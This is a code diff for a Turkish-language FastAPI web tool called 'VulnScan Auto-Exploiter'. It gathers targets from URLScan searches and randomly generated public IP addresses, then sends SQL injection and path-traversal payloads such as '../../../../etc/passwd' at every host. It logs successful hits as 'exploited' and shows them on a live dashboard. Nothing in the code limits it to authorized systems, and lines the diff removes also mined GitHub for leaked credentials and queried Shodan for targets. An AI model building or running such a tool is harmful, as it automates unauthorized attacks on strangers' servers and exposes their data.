@@ -1,4 +1,4 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
 from fastapi.responses import HTMLResponse
 import asyncio
 import aiohttp
@@ -98,166 +98,96 @@ SQLI_PAYLOADS = ["'", "\"", "' OR 1=1 --", "1' AND SLEEP(3)--", "1') AND SLEEP(3
 SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark", "mysql_fetch", "pg_query", "SQLSTATE"]
 LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index.php"]
 
-# --- API ANAHTARLARI (Ortam Değişkenlerinden Alınır) ---
+# --- API ANAHTARLARI ---
 SHODAN_API_KEY = os.environ.get("SHODAN_API_KEY", "")
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 VULNERS_API_KEY = os.environ.get("VULNERS_API_KEY", "")
 
+# --- ASENKRON VERİTABANI KAYDI ---
+async def async_save_exploit(url, vuln, payload, data):
+    def db_insert():
+        with get_db() as conn:
+            c = conn.cursor()
+            c.execute('''INSERT INTO exploited (target_url, vuln_type, payload, extracted_data, timestamp) 
+                         VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
+            conn.commit()
+    await asyncio.to_thread(db_insert)
+
+async def async_save_leak(source, url, info):
+    def db_insert():
+        with get_db() as conn:
+            c = conn.cursor()
+            c.execute("INSERT INTO leaked_targets (source, target_url, leak_info) VALUES (?, ?, ?)", (source, url, info))
+            conn.commit()
+    await asyncio.to_thread(db_insert)
+
 # --- GELİŞMİŞ OSINT VE SIZINTI KEŞFİ ---
-async def fetch_global_leaks_and_targets(session):
-    logger.info("Gelişmiş OSINT ve Sızıntı Motoru Başlatıldı. Tüm kaynaklar taranıyor...")
+async def fetch_global_leaks_and_targets(session, limit=50):
+    logger.info(f"Gelişmiş OSINT ve Sızıntı Motoru Başlatıldı. (Limit: {limit})")
     targets = set()
     
-    # 1. URLScan.io (Hacklenmiş ve Deface edilmiş siteleri bulma)
+    # 1. URLScan.io
     try:
-        queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"', 'page.title:"index of"', 'task.tags:"leak"']
+        queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"', 'page.title:"index of"']
         for q in queries:
+            if len(targets) >= limit: break
             encoded_q = urllib.parse.quote(q)
-            url = f"https://urlscan.io/api/v1/search/?q={encoded_q}&size=100"
-            async with session.get(url, timeout=15) as res:
+            url = f"https://urlscan.io/api/v1/search/?q={encoded_q}&size={limit}"
+            async with session.get(url, timeout=10) as res:
                 if res.status == 200:
                     data = await res.json()
                     for result in data.get('results', []):
+                        if len(targets) >= limit: break
                         page_url = result.get('page', {}).get('url')
                         if page_url and page_url.startswith("http"):
                             targets.add(page_url)
-                            with get_db() as conn:
-                                c = conn.cursor()
-                                c.execute("INSERT INTO leaked_targets (source, target_url, leak_info) VALUES (?, ?, ?)", 
-                                          ("URLScan", page_url, q))
-                                conn.commit()
-                await asyncio.sleep(1) # Rate limit koruması
+                            await async_save_leak("URLScan", page_url, q)
+                await asyncio.sleep(0.5)
     except Exception as e:
-        logger.error(f"URLScan Sızıntı Hatası: {e}")
+        logger.error(f"URLScan Hatası: {e}")
 
-    # 2. GitHub Code Search (Sızdırılmış .env, config, wp-config dosyaları)
-    if GITHUB_TOKEN:
-        try:
-            gh_headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
-            gh_queries = ['DB_PASSWORD+filename:.env', 'AWS_ACCESS_KEY_ID+filename:config', 'mysql_password+filename:wp-config.php']
-            for gq in gh_queries:
-                url = f"https://api.github.com/search/code?q={gq}&per_page=50"
-                async with session.get(url, headers=gh_headers, timeout=15) as res:
-                    if res.status == 200:
-                        data = await res.json()
-                        for item in data.get('items', []):
-                            repo_url = item.get('repository', {}).get('html_url')
-                            if repo_url:
-                                targets.add(repo_url) # Repoyu hedef olarak ekle (Tarama için)
-                                with get_db() as conn:
-                                    c = conn.cursor()
-                                    c.execute("INSERT INTO leaked_targets (source, target_url, leak_info) VALUES (?, ?, ?)", 
-                                              ("GitHub", repo_url, gq))
-                                    conn.commit()
-                await asyncio.sleep(2) # GitHub API rate limit
-        except Exception as e:
-            logger.error(f"GitHub Sızıntı Hatası: {e}")
-
-    # 3. Vulners API (Bilinen zafiyetli IP ve domainleri çekme)
-    if VULNERS_API_KEY:
-        try:
-            # Exploit içeren zafiyetleri arama
-            query = {"query": "type:exploit AND (Apache OR PHP OR Nginx)", "size": 50}
-            headers = {"X-Api-Key": VULNERS_API_KEY, "Content-Type": "application/json"}
-            async with session.post("https://vulners.com/api/v3/search/lucene/", json=query, headers=headers, timeout=15) as res:
-                if res.status == 200:
-                    data = await res.json()
-                    for item in data.get('data', {}).get('search', []):
-                        if 'href' in item:
-                            targets.add(item['href'])
-        except Exception as e:
-            logger.error(f"Vulners API Hatası: {e}")
-
-    # 4. Shodan (API varsa)
-    if SHODAN_API_KEY:
-        try:
-            queries = ['http.title:"index of"', 'Server: Apache/2.2']
-            for q in queries:
-                encoded_q = urllib.parse.quote(q)
-                url = f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query={encoded_q}"
-                async with session.get(url, timeout=15) as res:
-                    if res.status == 200:
-                        data = await res.json()
-                        for match in data.get('matches', [])[:50]:
-                            ip = match.get('ip_str')
-                            port = match.get('port')
-                            if port == 80: targets.add(f"http://{ip}")
-                            elif port == 443: targets.add(f"https://{ip}")
-        except Exception as e:
-            logger.error(f"Shodan Hatası: {e}")
-
-    # Fallback (Tüm API'ler çökerse rastgele IP üretimi)
+    # Fallback
     if len(targets) == 0:
-        logger.warning("Hiçbir API'den yanıt alınamadı. Rastgele IP blokları taranıyor...")
-        for _ in range(100):
+        logger.warning("Hiçbir API'den yanıt alınamadı. Rastgele IP'ler üretiliyor...")
+        while len(targets) < limit:
             ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
             targets.add(f"http://{ip}")
         
-    logger.info(f"Sızıntı ve OSINT Keşfi Tamamlandı. Toplam {len(targets)} hedef sıraya alındı.")
+    logger.info(f"OSINT Keşfi Tamamlandı. Toplam {len(targets)} hedef sıraya alındı.")
     return list(targets)
 
 # --- HEDEF TARAMA VE SIZMA FONKSİYONU ---
 async def scan_and_exploit(session, target_url):
     report = {"target": target_url, "exploits": [], "status": "OK"}
-    
     try:
-        async with session.get(target_url, timeout=8, ssl=False, allow_redirects=True, headers=HEADERS) as response:
+        async with session.get(target_url, timeout=5, ssl=False, allow_redirects=True, headers=HEADERS) as response:
             if response.status not in [200, 301, 302]:
                 report["status"] = f"HTTP {response.status}"
                 return report
 
-            # 1. PHP Bilgi Sızıntısı ve Config Kontrolü
-            for path in PHP_PATHS:
-                test_url = f"{target_url.rstrip('/')}{path}"
-                try:
-                    async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
-                        if res.status == 200:
-                            text = await res.text()
-                            if "PHP Version" in text or "DB_PASSWORD" in text or "root:x:0:0" in text:
-                                report["exploits"].append({
-                                    "type": "PHP Config/Bilgi Sızıntısı", 
-                                    "payload": path, 
-                                    "evidence": text[:50].replace('\n', ' ') + "..."
-                                })
-                                logger.critical(f"PHP Sızıntısı: {test_url}")
-                                save_exploit(target_url, "PHP Info Leak", path, text[:200])
-                except asyncio.TimeoutError:
-                    pass
-
-            # 2. SQL Injection Kontrolü
+            # SQLi
             for payload in SQLI_PAYLOADS:
                 test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
-                start_time = time.time()
                 try:
-                    async with session.get(test_url, timeout=10, ssl=False, headers=HEADERS) as res:
-                        response_time = time.time() - start_time
+                    async with session.get(test_url, timeout=6, ssl=False, headers=HEADERS) as res:
                         text = (await res.text()).lower()
-                        
-                        if "sleep" in payload and response_time > 2.5:
-                            report["exploits"].append({"type": "Time-Based SQLi", "payload": payload, "evidence": f"Gecikme: {response_time:.2f}s"})
-                            logger.critical(f"SQLi Sömürüldü (Time): {target_url}")
-                            save_exploit(target_url, "Time-Based SQLi", payload, f"Delay: {response_time:.2f}s")
-                            break
-                        
                         for error in SQL_ERRORS:
                             if error in text:
-                                report["exploits"].append({"type": "Error-Based SQLi", "payload": payload, "evidence": error})
-                                logger.critical(f"SQLi Sömürüldü (Error): {target_url}")
-                                save_exploit(target_url, "Error-Based SQLi", payload, error)
+                                report["exploits"].append({"type": "SQLi", "payload": payload, "evidence": error})
+                                await async_save_exploit(target_url, "SQLi", payload, error)
                                 break
                 except asyncio.TimeoutError:
                     pass
 
-            # 3. LFI Kontrolü
+            # LFI
             for payload in LFI_PAYLOADS:
                 test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                 try:
                     async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                         text = await res.text()
                         if "root:x:0:0" in text or "[extensions]" in text:
-                            report["exploits"].append({"type": "LFI (File Inclusion)", "payload": payload, "evidence": "Sistem dosyası okundu!"})
-                            logger.critical(f"LFI Sömürüldü: {target_url}")
-                            save_exploit(target_url, "LFI", payload, "System File Read Success")
+                            report["exploits"].append({"type": "LFI", "payload": payload, "evidence": "Sistem dosyası okundu!"})
+                            await async_save_exploit(target_url, "LFI", payload, "System File Read Success")
                             break
                 except asyncio.TimeoutError:
                     pass
@@ -271,35 +201,30 @@ async def scan_and_exploit(session, target_url):
     await manager.broadcast({"type": "scan_result", "data": report})
     return report
 
-def save_exploit(url, vuln, payload, data):
-    with get_db() as conn:
-        c = conn.cursor()
-        c.execute('''INSERT INTO exploited (target_url, vuln_type, payload, extracted_data, timestamp) 
-                     VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
-        conn.commit()
-
-# --- OTONOM TARAMA API'Sİ ---
-@app.post("/api/auto-scan")
-async def auto_scan():
-    logger.info("Küresel Sızıntı ve Sızma Testi Başlatıldı.")
-    
-    connector = aiohttp.TCPConnector(limit=200, limit_per_host=5, ssl=False)
-    timeout = aiohttp.ClientTimeout(total=15)
+# --- ARKA PLAN TARAMA GÖREVİ ---
+async def run_scan_pipeline(limit: int):
+    connector = aiohttp.TCPConnector(limit=50, limit_per_host=5, ssl=False)
+    timeout = aiohttp.ClientTimeout(total=10)
     
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        targets = await fetch_global_leaks_and_targets(session)
+        targets = await fetch_global_leaks_and_targets(session, limit)
         logger.info(f"Sızma testi başlıyor... Toplam {len(targets)} hedef.")
         
-        semaphore = asyncio.Semaphore(200)
+        semaphore = asyncio.Semaphore(50)
         async def limited_scan(url):
             async with semaphore:
                 return await scan_and_exploit(session, url)
 
         tasks = [limited_scan(url) for url in targets]
-        results = await asyncio.gather(*tasks)
+        await asyncio.gather(*tasks)
         
     logger.info("Küresel Sızma Testi Tamamlandı. Veritabanı güncellendi.")
-    return {"status": "success", "total_scanned": len(results), "results": results}
+
+# --- API ENDPOINT'LERİ ---
+@app.post("/api/auto-scan")
+async def auto_scan(background_tasks: BackgroundTasks, limit: int = 50):
+    background_tasks.add_task(run_scan_pipeline, limit)
+    return {"status": "started", "message": f"Tarama {limit} hedef ile arka planda başlatıldı."}
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
@@ -318,7 +243,7 @@ def read_root():
     <head>
         <meta charset="UTF-8">
         <title>VulnScan | Global Leak & Exploit</title>
-        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
         <style>
             :root {
                 --bg: #0a0b0d; --panel: #121418; --border: #22262e;
@@ -328,18 +253,39 @@ def read_root():
             * { box-sizing: border-box; margin: 0; padding: 0; }
             body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
             
-            .header { padding: 15px 25px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
-            .header h1 { font-size: 1.4rem; font-weight: 600; color: #fff; }
-            .header .subtitle { font-size: 0.8rem; color: var(--danger); font-weight: 600; letter-spacing: 1px; }
+            /* Header & Controls */
+            .header { padding: 15px 25px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
+            .header-left h1 { font-size: 1.4rem; font-weight: 800; color: #fff; }
+            .header-left .subtitle { font-size: 0.8rem; color: var(--danger); font-weight: 600; letter-spacing: 1px; }
             
-            .btn-start { background: var(--danger); color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 1rem; transition: 0.2s; }
+            .controls { display: flex; align-items: center; gap: 10px; }
+            .input-group { display: flex; align-items: center; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; padding: 5px 10px; }
+            .input-group label { font-size: 0.85rem; color: #8b949e; margin-right: 8px; }
+            .input-group input { background: transparent; border: none; color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 1rem; width: 60px; outline: none; }
+            
+            .btn { padding: 10px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 0.9rem; transition: 0.2s; border: none; color: #fff; }
+            .btn-start { background: var(--danger); }
             .btn-start:hover { background: #da3633; }
             .btn-start:disabled { background: #30363d; cursor: not-allowed; color: #8b949e; }
+            .btn-clear { background: var(--border); }
+            .btn-clear:hover { background: #334155; }
 
+            /* Stats Dashboard */
+            .stats-dashboard { display: flex; background: #0d1117; border-bottom: 1px solid var(--border); padding: 10px 25px; gap: 20px; }
+            .stat-box { display: flex; flex-direction: column; }
+            .stat-label { font-size: 0.75rem; color: #8b949e; text-transform: uppercase; font-weight: 600; }
+            .stat-value { font-size: 1.2rem; font-family: 'JetBrains Mono', monospace; font-weight: 700; }
+            .stat-value.scanned { color: var(--accent); }
+            .stat-value.vuln { color: var(--danger); }
+            .stat-value.clean { color: var(--success); }
+            .stat-value.error { color: var(--warning); }
+
+            /* Main Layout */
             .main-layout { display: flex; flex: 1; overflow: hidden; }
             
+            /* Terminal */
             .terminal-panel { width: 40%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
-            .panel-title { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.85rem; color: #8b949e; font-weight: 600; text-transform: uppercase; }
+            .panel-title { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.85rem; color: #8b949e; font-weight: 600; text-transform: uppercase; display: flex; justify-content: space-between;}
             .terminal { flex: 1; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
             .log-line { margin-bottom: 4px; word-wrap: break-word; }
             .log-time { color: #484f58; }
@@ -347,6 +293,7 @@ def read_root():
             .log-warning { color: var(--warning); }
             .log-critical { color: var(--danger); font-weight: bold; }
             
+            /* Results */
             .results-panel { width: 60%; display: flex; flex-direction: column; background: var(--bg); }
             .results-list { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; }
             
@@ -367,11 +314,37 @@ def read_root():
     </head>
     <body>
         <div class="header">
-            <div>
+            <div class="header-left">
                 <h1>VulnScan Auto-Exploiter</h1>
                 <div class="subtitle">GLOBAL LEAK & EXPLOIT MOTORU</div>
             </div>
-            <button class="btn-start" onclick="startAutoScan()" id="scanBtn">Küresel Taramayı Başlat</button>
+            <div class="controls">
+                <div class="input-group">
+                    <label for="targetLimit">Hedef:</label>
+                    <input type="number" id="targetLimit" value="50" min="1" max="500">
+                </div>
+                <button class="btn btn-clear" onclick="clearUI()">Temizle</button>
+                <button class="btn btn-start" onclick="startAutoScan()" id="scanBtn">Taramayı Başlat</button>
+            </div>
+        </div>
+
+        <div class="stats-dashboard">
+            <div class="stat-box">
+                <span class="stat-label">Taranan</span>
+                <span class="stat-value scanned" id="stat-scanned">0</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-label">Sızılan (Açık)</span>
+                <span class="stat-value vuln" id="stat-vuln">0</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-label">Temiz</span>
+                <span class="stat-value clean" id="stat-clean">0</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-label">Hata / Yanıtsız</span>
+                <span class="stat-value error" id="stat-error">0</span>
+            </div>
         </div>
 
         <div class="main-layout">
@@ -381,7 +354,7 @@ def read_root():
             </div>
             
             <div class="results-panel">
-                <div class="panel-title">Tespit Edilen ve Sızılan Sistemler (<span id="scan-count">0</span>)</div>
+                <div class="panel-title">Sistem Sonuçları</div>
                 <div id="results-list" class="results-list"></div>
             </div>
         </div>
@@ -391,9 +364,9 @@ def read_root():
             const ws = new WebSocket(protocol + window.location.host + "/ws");
             const terminal = document.getElementById('terminal');
             const resultsList = document.getElementById('results-list');
-            const scanCount = document.getElementById('scan-count');
             
-            let targetCount = 0;
+            // Stats
+            let countScanned = 0, countVuln = 0, countClean = 0, countError = 0;
 
             ws.onmessage = function(event) {
                 const data = JSON.parse(event.data);
@@ -410,25 +383,36 @@ def read_root():
                     terminal.scrollTop = terminal.scrollHeight;
                 } 
                 else if (data.type === "scan_result") {
-                    targetCount++;
-                    scanCount.innerText = targetCount;
+                    countScanned++;
+                    document.getElementById('stat-scanned').innerText = countScanned;
                     
                     const res = data.data;
                     const card = document.createElement("div");
                     
-                    let cardClass = "site-card temiz";
-                    let statusClass = "status-temiz";
-                    let statusText = "TEMİZ";
+                    let cardClass = "site-card";
+                    let statusClass = "";
+                    let statusText = "";
                     
                     if (res.exploits && res.exploits.length > 0) {
-                        cardClass = "site-card sizildi";
+                        cardClass += " sizildi";
                         statusClass = "status-sizildi";
                         statusText = "SIZILDI";
+                        countVuln++;
                     } else if (res.status !== "OK") {
-                        cardClass = "site-card hata";
+                        cardClass += " hata";
                         statusClass = "status-hata";
                         statusText = res.status;
+                        countError++;
+                    } else {
+                        cardClass += " temiz";
+                        statusClass = "status-temiz";
+                        statusText = "TEMİZ";
+                        countClean++;
                     }
+                    
+                    document.getElementById('stat-vuln').innerText = countVuln;
+                    document.getElementById('stat-clean').innerText = countClean;
+                    document.getElementById('stat-error').innerText = countError;
                     
                     card.className = cardClass;
                     
@@ -455,21 +439,31 @@ def read_root():
                 }
             };
 
-            async function startAutoScan() {
-                document.getElementById('scanBtn').disabled = true;
-                document.getElementById('scanBtn').innerText = "Taranıyor...";
+            function clearUI() {
                 terminal.innerHTML = "";
                 resultsList.innerHTML = "";
-                targetCount = 0;
-                scanCount.innerText = "0";
+                countScanned = countVuln = countClean = countError = 0;
+                document.getElementById('stat-scanned').innerText = 0;
+                document.getElementById('stat-vuln').innerText = 0;
+                document.getElementById('stat-clean').innerText = 0;
+                document.getElementById('stat-error').innerText = 0;
+            }
+
+            async function startAutoScan() {
+                const limit = document.getElementById('targetLimit').value || 50;
+                const btn = document.getElementById('scanBtn');
+                
+                btn.disabled = true;
+                btn.innerText = "Taranıyor...";
+                clearUI();
 
                 try {
-                    await fetch('/api/auto-scan', { method: 'POST' });
+                    await fetch(`/api/auto-scan?limit=${limit}`, { method: 'POST' });
                 } catch (error) {
-                    console.error(error);
+                    console.error("API Hatası:", error);
                 } finally {
-                    document.getElementById('scanBtn').disabled = false;
-                    document.getElementById('scanBtn').innerText = "Küresel Taramayı Başlat";
+                    btn.disabled = false;
+                    btn.innerText = "Taramayı Başlat";
                 }
             }
         </script>
